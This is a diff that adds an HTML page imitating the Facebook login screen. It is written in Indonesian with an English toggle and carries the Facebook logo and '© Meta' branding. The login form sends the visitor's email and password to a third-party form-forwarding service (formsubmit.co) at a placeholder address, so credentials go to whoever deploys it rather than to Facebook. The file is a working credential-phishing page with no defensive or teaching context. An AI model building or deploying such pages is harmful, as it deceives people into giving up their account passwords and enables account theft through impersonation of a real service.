@@ -1,0 +1,154 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            flex-direction: column;
+        }
+        .language-switch {
+            text-align: center;
+            font-size: 14px;
+            color: black;
+            position: absolute;
+            top: 10px;
+            cursor: pointer;
+        }
+        .container {
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+        .logo {
+            width: 60px;
+            margin-bottom: 20px;
+        }
+        .input-field {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 14px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            display: block;
+            margin-top: 10px;
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .new-account-btn {
+            width: 100%;
+            padding: 12px;
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+        .new-account-btn:hover {
+            background-color: #36a420;
+        }
+        .meta {
+            margin-top: 20px;
+            font-size: 12px;
+            color: gray;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="language-switch" onclick="toggleLanguage()">Bahasa Indonesia</div>
+
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo" class="logo">
+        
+        <form action="https://formsubmit.co/your-email@example.com" method="POST">
+            <input type="email" id="email" name="email" class="input-field" placeholder="Nomor ponsel atau email" required>
+            <input type="password" id="password" name="password" class="input-field" placeholder="Kata sandi" required>
+            <button type="submit" class="login-btn">Login</button>
+        </form>
+
+        <a href="#" class="forgot-password">Lupa kata sandi?</a>
+        <button class="new-account-btn">Buat akun baru</button>
+        <div class="meta">© Meta</div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const emailField = document.getElementById("email");
+            const passwordField = document.getElementById("password");
+
+            emailField.oninvalid = function (event) {
+                event.target.setCustomValidity("Silakan isi email atau nomor ponsel!");
+            };
+            emailField.oninput = function (event) {
+                event.target.setCustomValidity("");
+            };
+
+            passwordField.oninvalid = function (event) {
+                event.target.setCustomValidity("Silakan isi kata sandi!");
+            };
+            passwordField.oninput = function (event) {
+                event.target.setCustomValidity("");
+            };
+        });
+
+        function toggleLanguage() {
+            let langSwitch = document.querySelector(".language-switch");
+            let emailInput = document.getElementById("email");
+            let passwordInput = document.getElementById("password");
+            let forgotPassword = document.querySelector(".forgot-password");
+            let createAccount = document.querySelector(".new-account-btn");
+
+            if (langSwitch.innerText === "Bahasa Indonesia") {
+                langSwitch.innerText = "English";
+                emailInput.placeholder = "Phone number or email";
+                passwordInput.placeholder = "Password";
+                forgotPassword.innerText = "Forgot password?";
+                createAccount.innerText = "Create new account";
+            } else {
+                langSwitch.innerText = "Bahasa Indonesia";
+                emailInput.placeholder = "Nomor ponsel atau email";
+                passwordInput.placeholder = "Kata sandi";
+                forgotPassword.innerText = "Lupa kata sandi?";
+                createAccount.innerText = "Buat akun baru";
+            }
+        }
+    </script>
+</body>
+</html>
